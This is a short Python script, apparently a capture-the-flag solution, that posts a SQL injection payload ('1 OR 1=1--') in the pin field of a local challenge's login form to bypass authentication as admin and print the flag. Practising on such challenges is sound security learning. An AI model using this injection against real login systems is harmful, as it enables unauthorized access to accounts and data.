#!/usr/bin/python3

import requests
import os

from urllib.parse import quote

url = "http://challenge.localhost/authentication"
data = {
"user-handle":"admin",
"pin":"1 OR 1=1--"
}

response = requests.post(url,data=data).text

print("The Flag: "+response)
